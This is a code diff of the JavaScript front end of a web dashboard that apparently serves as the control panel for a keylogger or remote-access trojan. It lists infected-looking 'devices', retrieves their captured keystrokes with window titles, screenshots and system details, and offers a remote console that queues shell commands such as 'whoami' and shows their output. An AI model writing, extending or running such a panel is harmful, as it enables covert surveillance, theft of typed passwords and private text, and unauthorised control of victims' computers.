-                const day = String(date.getUTCDate()).padStart(2, '0');
-                const hours = String(date.getUTCHours()).padStart(2, '0');
-                const minutes = String(date.getUTCMinutes()).padStart(2, '0');
-                const seconds = String(date.getUTCSeconds()).padStart(2, '0');
-                
-                return `${year}-${month}-${day} ${hours}:${minutes}:${seconds} UTC`;
-            } catch (e) {
-                console.error("Error formatting timestamp:", dateString, e);
-                return String(dateString); // Fallback to original string on any unexpected error
+      async function sendConsoleCommand(deviceId) {
+        const commandInput = document.getElementById('commandInput')
+        const command = commandInput.value.trim()
+        const consoleOutput = document.getElementById('consoleOutput')
+        if (!command) return
+        consoleOutput.innerHTML += `<div class="console-entry mb-1"><span class="text-primary">&gt; ${escapeHtml(
+          command
+        )}</span></div>`
+        commandInput.value = ''
+        try {
+          const response = await fetch(
+            `${API_BASE_URL}/dashboard/api/devices/${deviceId}/command`,
+            {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ command: command })
             }
+          )
+          const data = await response.json()
+          if (!response.ok) {
+            consoleOutput.innerHTML += `<div class="console-entry mb-1"><span class="text-danger">Error: ${escapeHtml(
+              data.detail || 'Failed to send command'
+            )} (Status: ${response.status})</span></div>`
+          } else {
+            consoleOutput.innerHTML += `<div class="console-entry mb-1"><span class="text-success">Command sent (ID: ${escapeHtml(
+              data.command_id
+            )}, Status: ${escapeHtml(
+              data.status
+            )}). Output in Command History.</span></div>`
+          }
+        } catch (error) {
+          consoleOutput.innerHTML += `<div class="console-entry mb-1"><span class="text-danger">Network error: ${escapeHtml(
+            error.message
+          )}</span></div>`
         }
+        consoleOutput.scrollTop = consoleOutput.scrollHeight
+      }
 
-        // --- Device Rendering ---
-        function renderDevices(devices) {
-            deviceGrid.innerHTML = ''; // Clear previous grid
-            deviceListTableBody.innerHTML = ''; // Clear previous list
-
-            if (!devices || devices.length === 0) {
-                deviceGrid.innerHTML = '<p class="text-muted col-12">No devices found.</p>';
-                deviceListTableBody.innerHTML = '<tr><td colspan="6" class="text-muted text-center">No devices found.</td></tr>';
-                return;
-            }
-
-            devices.forEach(device => {
-                // Populate Grid Card
-                const cardTemplate = document.getElementById('deviceCardTemplate').content.cloneNode(true);
-                const card = cardTemplate.querySelector('.device-card');
-                card.dataset.deviceId = device.id;
-                card.querySelector('[data-field="name"]').textContent = device.name || 'Unknown Device';
-                const statusBadgeCard = card.querySelector('[data-field="status"]');
-                statusBadgeCard.textContent = device.status.charAt(0).toUpperCase() + device.status.slice(1);
-                statusBadgeCard.className = `badge status ${device.status.toLowerCase()}`; // Ensure class is lowercase
-                card.querySelector('[data-field="id"]').textContent = device.id;
-                card.querySelector('[data-field="ip_address"]').textContent = device.ip_address || 'N/A';
-                card.querySelector('[data-field="last_seen"]').textContent = formatTimestampToUTC(device.last_seen);
-                card.querySelector('[data-field="cpu_usage"]').textContent = device.cpu_usage || 'N/A';
-                card.querySelector('[data-field="ram_usage"]').textContent = device.ram_usage || 'N/A';
-                // card.querySelector('[data-field="uptime"]').textContent = device.uptime || 'N/A';
-                
-                // Add event listeners for card actions
-                card.querySelectorAll('[data-action]').forEach(button => {
-                    button.addEventListener('click', () => handleDeviceAction(device.id, device.name, button.dataset.action));
-                });
-                deviceGrid.appendChild(cardTemplate);
-
-                // Populate List Row
-                const rowTemplate = document.getElementById('deviceListRowTemplate').content.cloneNode(true);
-                const row = rowTemplate.querySelector('tr');
-                row.dataset.deviceId = device.id;
-                const statusBadgeList = row.querySelector('[data-field="status"]');
-                statusBadgeList.textContent = device.status.charAt(0).toUpperCase() + device.status.slice(1);
-                statusBadgeList.className = `badge status ${device.status.toLowerCase()}`;
-                row.querySelector('[data-field="name"]').textContent = device.name || 'Unknown Device';
-                row.querySelector('[data-field="id"]').textContent = device.id;
-                row.querySelector('[data-field="ip_address"]').textContent = device.ip_address || 'N/A';
-                row.querySelector('[data-field="last_seen"]').textContent = formatTimestampToUTC(device.last_seen);
-
-                // Add event listeners for list actions
-                row.querySelectorAll('[data-action]').forEach(button => {
-                    button.addEventListener('click', () => handleDeviceAction(device.id, device.name, button.dataset.action));
-                });
-                deviceListTableBody.appendChild(rowTemplate);
-            });
-        }
-
-        // --- API Calls ---
-        async function fetchDevices() {
-            try {
-                const response = await fetch(`${API_BASE_URL}/dashboard/api/devices`);
-                if (!response.ok) {
-                    const errorData = await response.json().catch(() => ({ detail: 'Failed to fetch devices. Network error.' }));
-                    throw new Error(errorData.detail || `HTTP error! status: ${response.status}`);
-                }
-                allDevicesData = await response.json();
-                renderDevices(allDevicesData);
-            } catch (error) {
-                console.error('Error fetching devices:', error);
-                deviceGrid.innerHTML = `<p class="text-danger col-12">Error loading devices: ${error.message}</p>`;
-                deviceListTableBody.innerHTML = `<tr><td colspan="6" class="text-danger text-center">Error loading devices: ${error.message}</td></tr>`;
-            }
-        }
-        
-        // --- Event Handlers ---
-        deviceSearchInput.addEventListener('input', (e) => {
-            const searchTerm = e.target.value.toLowerCase();
-            const filteredDevices = allDevicesData.filter(device => 
-                (device.name && device.name.toLowerCase().includes(searchTerm)) ||
-                (device.id && device.id.toLowerCase().includes(searchTerm))
-            );
-            renderDevices(filteredDevices);
-        });
-
-        toggleViewButton.addEventListener('click', () => {
+      const navLinks = document.querySelectorAll('.nav-link')
+      const contentSections = document.querySelectorAll('.content-section')
+      const deviceViewContainers = [deviceGridContainer, deviceListContainer]
+      navLinks.forEach(link => {
+        link.addEventListener('click', e => {
+          e.preventDefault()
+          navLinks.forEach(l => l.classList.remove('active'))
+          link.classList.add('active')
+          const targetSectionId = link.dataset.section
+          contentSections.forEach(sec => (sec.style.display = 'none'))
+          deviceViewContainers.forEach(cont => (cont.style.display = 'none'))
+          document.getElementById('funcutils').style.display = 'none'
+          if (targetSectionId === 'devices') {
+            document.getElementById('funcutils').style.display = 'flex'
             if (currentView === 'grid') {
-                deviceGridContainer.style.display = 'none';
-                deviceListContainer.style.display = 'block';
-                toggleViewButton.innerHTML = '<i class="fas fa-th-large me-2"></i> Switch to Grid View';
-                currentView = 'list';
+              deviceGridContainer.style.display = 'block'
             } else {
-                deviceGridContainer.style.display = 'block';
-                deviceListContainer.style.display = 'none';
-                toggleViewButton.innerHTML = '<i class="fas fa-list me-2"></i> Switch to List View';
-                currentView = 'grid';
+              deviceListContainer.style.display = 'block'
             }
-        });
-        
-        refreshDevicesButton.addEventListener('click', fetchDevices);
+            fetchDevices()
+          } else {
+            const targetSection = document.getElementById(
+              `${targetSectionId}Section`
+            )
+            if (targetSection) targetSection.style.display = 'block'
+          }
+        })
+      })
 
-        // --- Device Actions ---
-        async function handleDeviceAction(deviceId, deviceName, action) {
-            modalContentEl.innerHTML = '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p>Loading...</p></div>';
-            actionModal.show(); // Show modal immediately with loading indicator
-
-            const titlePrefix = `${deviceName || deviceId}`;
-
-            if (action === 'details') {
-                try {
-                    const response = await fetch(`${API_BASE_URL}/dashboard/api/devices/${deviceId}/details`);
-                    const data = await response.json();
-                    if (!response.ok) throw new Error(data.detail || 'Failed to fetch details');
-                    
-                    let detailsHtml = `<h5 class="mb-3">System Details for ${data.computer_name || deviceId}</h5>`;
-                    detailsHtml += `<dl class="row">
-                        <dt class="col-sm-4">Machine ID</dt><dd class="col-sm-8">${data.machine_id}</dd>
-                        <dt class="col-sm-4">Computer Name</dt><dd class="col-sm-8">${data.computer_name || 'N/A'}</dd>
-                        <dt class="col-sm-4">OS Version</dt><dd class="col-sm-8">${data.os_version || 'N/A'}</dd>
-                        <dt class="col-sm-4">Processor Arch</dt><dd class="col-sm-8">${data.processor_arch || 'N/A'}</dd>
-                        <dt class="col-sm-4">Num Processors</dt><dd class="col-sm-8">${data.num_processors || 'N/A'}</dd>
-                        <dt class="col-sm-4">Total RAM</dt><dd class="col-sm-8">${data.total_ram_mb ? data.total_ram_mb + ' MB' : 'N/A'}</dd>
-                        <dt class="col-sm-4">Reported IP</dt><dd class="col-sm-8">${data.reported_ip || 'N/A'}</dd>
-                        <dt class="col-sm-4">First Seen</dt><dd class="col-sm-8">${formatTimestampToUTC(data.first_seen)}</dd>
-                        <dt class="col-sm-4">Last Seen</dt><dd class="col-sm-8">${formatTimestampToUTC(data.last_seen)}</dd>
-                    </dl>`;
-                    if(data.system_info_string_formatted) {
-                        detailsHtml += `<h6>Full System Info:</h6><pre class="bg-light text-dark p-2 rounded small">${data.system_info_string_formatted.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
-                    }
-                    showModal(`${titlePrefix} - System Details`, detailsHtml);
-                } catch (error) {
-                    showErrorInModal(`${titlePrefix} - Error`, error.message);
-                }
-            } else if (action === 'keylogs') {
-                try {
-                    const response = await fetch(`${API_BASE_URL}/dashboard/api/devices/${deviceId}/keylogs?limit=500`); // Added limit
-                    const data = await response.json();
-                    if (!response.ok) throw new Error(data.detail || 'Failed to fetch keylogs');
-                    
-                    let logsHtml = `<h5>Keylogs (Last ${data.length} entries)</h5>`;
-                    if (data.length > 0) {
-                        logsHtml += '<div class="list-group" style="max-height: 400px; overflow-y: auto;">';
-                        data.forEach(log => {
-                            logsHtml += `
-                                <div class="list-group-item list-group-item-dark flex-column align-items-start mb-1 p-2">
-                                    <div class="d-flex w-100 justify-content-between">
-                                        <small class="text-muted">Client: ${formatTimestampToUTC(log.client_timestamp)}</small>
-                                        <small class="text-muted">Server: ${formatTimestampToUTC(log.server_timestamp)}</small>
-                                    </div>
-                                    <p class="mb-1 small"><strong>Window:</strong> ${log.window_title.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</p>
-                                    <pre class="mb-0 bg-secondary text-light p-1 rounded small" style="white-space: pre-wrap; word-break: break-all;">${log.log_data.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>
-                                </div>`;
-                        });
-                        logsHtml += '</div>';
-                    } else {
-                        logsHtml += '<p class="text-muted">No keylogs found for this device.</p>';
-                    }
-                    showModal(`${titlePrefix} - Keylogs`, logsHtml);
-                } catch (error) {
-                    showErrorInModal(`${titlePrefix} - Error`, error.message);
-                }
-            } else if (action === 'screenshot') {
-                 try {
-                    const response = await fetch(`${API_BASE_URL}/dashboard/api/devices/${deviceId}/screenshot`);
-                    const data = await response.json();
-                    if (!response.ok) throw new Error(data.detail || data.message || 'Failed to fetch screenshot placeholder');
-                    
-                    const screenshotHtml = `
-                        <img src="${data.screenshot_url}" alt="Device Screenshot Placeholder" class="img-fluid rounded mx-auto d-block" style="max-height:400px;">
-                        <p class="text-muted text-center mt-2">Timestamp: ${formatTimestampToUTC(data.timestamp)}</p>
-                        ${data.message ? `<p class="alert alert-info mt-2">${data.message}</p>` : ''}
-                    `;
-                    showModal(`${titlePrefix} - Screenshot`, screenshotHtml);
-                } catch (error) {
-                    showErrorInModal(`${titlePrefix} - Screenshot Error`, error.message);
-                }
-            } else if (action === 'console') {
-                const consoleHtml = `
-                    <div class="console-container bg-black p-3 rounded mb-3">
-                        <div id="consoleOutput" class="console-output mb-2" style="height: 250px; background-color: #1a1a1a; border-radius: 4px; padding: 10px; overflow-y: auto; font-family: monospace; color: #f0f0f0;">
-                            <p class="text-muted">Enter commands below. Output will appear here.</p>
-                        </div>
-                        <div class="input-group">
-                            <input type="text" id="commandInput" class="form-control bg-dark text-light border-secondary" placeholder="Enter command (e.g., dir, whoami)...">
-                            <button class="btn btn-primary" id="sendConsoleCommandBtn">Send</button>
-                        </div>
-                    </div>`;
-                showModal(`${titlePrefix} - Console`, consoleHtml);
-                document.getElementById('sendConsoleCommandBtn').onclick = () => sendConsoleCommand(deviceId);
-                document.getElementById('commandInput').addEventListener('keypress', function (e) {
-                    if (e.key === 'Enter') {
-                        sendConsoleCommand(deviceId);
-                    }
-                });
-            } else if (action === 'commandHistory') {
-                try {
-                    const response = await fetch(`${API_BASE_URL}/dashboard/api/devices/${deviceId}/commands?limit=50`);
-                    const commands = await response.json();
-                    if (!response.ok) throw new Error(commands.detail || 'Failed to fetch command history');
-
-                    let historyHtml = `<h5>Command History (Last ${commands.length} commands)</h5>`;
-                    if (commands.length > 0) {
-                        historyHtml += '<div class="list-group" style="max-height: 400px; overflow-y: auto;">';
-                        commands.forEach(cmd => {
-                            historyHtml += `
-                                <div class="list-group-item list-group-item-dark flex-column align-items-start mb-1 p-2">
-                                    <div class="d-flex w-100 justify-content-between">
-                                        <strong class="mb-1"><code>${cmd.command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</code></strong>
-                                        <span class="badge bg-${cmd.status === 'completed' ? 'success' : (cmd.status === 'pending' || cmd.status === 'executing' ? 'warning text-dark' : 'danger')}">${cmd.status}</span>
-                                    </div>
-                                    <small class="text-muted d-block">ID: ${cmd.command_id}</small>
-                                    <small class="text-muted d-block">Sent: ${formatTimestampToUTC(cmd.sent_timestamp)}</small>
-                                    ${cmd.executed_timestamp ? `<small class="text-muted d-block">Executed: ${formatTimestampToUTC(cmd.executed_timestamp)}</small>` : ''}
-                                    ${cmd.completed_timestamp ? `<small class="text-muted d-block">Completed: ${formatTimestampToUTC(cmd.completed_timestamp)}</small>` : ''}
-                                    ${cmd.output ? `<pre class="mt-1 mb-0 bg-secondary text-light p-1 rounded small" style="white-space: pre-wrap; word-break: break-all;">Output: ${cmd.output.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>` : ''}
-                                    ${cmd.error ? `<pre class="mt-1 mb-0 bg-danger text-light p-1 rounded small" style="white-space: pre-wrap; word-break: break-all;">Error: ${cmd.error.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>` : ''}
-                                </div>`;
-                        });
-                        historyHtml += '</div>';
-                    } else {
-                        historyHtml += '<p class="text-muted">No commands found for this device.</p>';
-                    }
-                    showModal(`${titlePrefix} - Command History`, historyHtml);
-                } catch (error) {
-                     showErrorInModal(`${titlePrefix} - Command History Error`, error.message);
-                }
-            }
-        }
-        
-        async function sendConsoleCommand(deviceId) {
-            const commandInput = document.getElementById('commandInput');
-            const command = commandInput.value.trim();
-            const consoleOutput = document.getElementById('consoleOutput');
-
-            if (!command) return;
-
-            // Display command in console
-            const promptEntry = document.createElement('div');
-            promptEntry.innerHTML = `<span class="text-primary">&gt; ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</span>`;
-            consoleOutput.appendChild(promptEntry);
-
-            commandInput.value = ''; // Clear input
-
-            try {
-                const response = await fetch(`${API_BASE_URL}/dashboard/api/devices/${deviceId}/command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ command: command }),
-                });
-                const data = await response.json();
-                
-                const outputEntry = document.createElement('div');
-                if (!response.ok) {
-                    outputEntry.innerHTML = `<span class="text-danger">Error: ${data.detail || 'Failed to send command'} (Status: ${response.status})</span>`;
-                } else {
-                     outputEntry.innerHTML = `<span class="text-success">Command sent (ID: ${data.command_id}, Status: ${data.status}). Output will appear in Command History once processed.</span>`;
-                }
-                consoleOutput.appendChild(outputEntry);
-
-            } catch (error) {
-                const errorEntry = document.createElement('div');
-                errorEntry.innerHTML = `<span class="text-danger">Network error sending command: ${error.message}</span>`;
-                consoleOutput.appendChild(errorEntry);
-            }
-            consoleOutput.scrollTop = consoleOutput.scrollHeight; // Scroll to bottom
-        }
-
-        // --- Navigation / Section Switching ---
-        const navLinks = document.querySelectorAll('.nav-link');
-        const contentSections = document.querySelectorAll('.content-section');
-        const deviceViewContainers = [deviceGridContainer, deviceListContainer];
-
-        navLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                navLinks.forEach(l => l.classList.remove('active'));
-                link.classList.add('active');
-
-                const targetSectionId = link.dataset.section;
-
-                // Hide all main content sections and device views
-                contentSections.forEach(sec => sec.style.display = 'none');
-                deviceViewContainers.forEach(cont => cont.style.display = 'none');
-                document.getElementById('funcutils').style.display = 'none'; // Hide search/toggle for non-device views
-
-                if (targetSectionId === 'devices') {
-                    document.getElementById('funcutils').style.display = 'flex';
-                    if (currentView === 'grid') {
-                        deviceGridContainer.style.display = 'block';
-                    } else {
-                        deviceListContainer.style.display = 'block';
-                    }
-                    fetchDevices(); // Refresh devices when switching to this tab
-                } else {
-                    const targetSection = document.getElementById(`${targetSectionId}Section`);
-                    if (targetSection) {
-                        targetSection.style.display = 'block';
-                    }
-                }
-            });
-        });
-
-
-        // --- Initial Load ---
-        document.addEventListener('DOMContentLoaded', () => {
-            // Set default view to devices
-            document.querySelector('.nav-link[data-section="devices"]').click();
-            // Initial fetch of devices
-            // fetchDevices(); // Called by the click event above
-
-            // Auto-refresh device list and status every 30 seconds
-            setInterval(fetchDevices, 30000);
-        });
-
+      document.addEventListener('DOMContentLoaded', () => {
+        document.querySelector('.nav-link[data-section="devices"]').click()
+        setInterval(fetchDevices, 30000)
+      })
     </script>
-</body>
+  </body>
 </html>
